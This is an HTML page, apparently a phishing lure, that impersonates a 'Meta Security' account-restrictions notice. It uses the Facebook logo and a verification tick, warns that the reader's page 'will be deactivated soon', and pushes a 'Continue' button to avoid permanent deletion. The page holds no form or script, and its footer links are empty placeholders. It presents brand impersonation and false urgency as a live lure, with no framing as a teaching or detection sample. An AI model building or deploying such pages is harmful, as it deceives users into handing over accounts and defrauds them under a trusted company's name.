<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Meta Security Notice</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f1f1f1;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 30px;
      width: 350px;
      text-align: center;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      position: relative;
    }
    .top-logo {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin-bottom: 20px;
    }
    .top-logo img {
      width: 30px;
      height: 30px;
      margin-right: 10px;
    }
    .main-icon {
      width: 100px;
      margin: 20px auto;
    }
    .heading {
      font-size: 20px;
      font-weight: bold;
    }
    .subheading {
      font-size: 16px;
      color: #333;
    }
    .tick-text {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-top: 10px;
      font-size: 14px;
      color: #555;
    }
    .tick-text img {
      width: 16px;
      height: 16px;
      margin-left: 5px;
    }
    .warning {
      color: red;
      font-weight: bold;
      margin-top: 20px;
    }
    .info-text {
      font-size: 14px;
      margin: 15px 0;
    }
    .btn {
      background-color: #1877f2;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    .footer-links {
      margin-top: 20px;
      font-size: 12px;
    }
    .footer-links a {
      margin: 0 5px;
      color: #555;
      text-decoration: none;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="top-logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    <span class="heading">Meta Security</span>
  </div>
  <div class="subheading tick-text">
    Account Restrictions Service
    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Blue Tick">
  </div>

  <img src="https://cdn-icons-png.flaticon.com/512/545/545705.png" alt="Main Icon" class="main-icon">

  <div class="warning">Your Page Will Be Deactivated Soon</div>
  <div class="info-text">
    We will walk you through several steps to request a review.<br>
    You should complete these steps so that your page will not be deleted permanently.
  </div>
  <button class="btn">Continue</button>

  <div class="footer-links">
    <a href="#">Terms of Service</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Community Standards</a> |
    <a href="#">Help Center</a>
  </div>
</div>

</body>
</html>
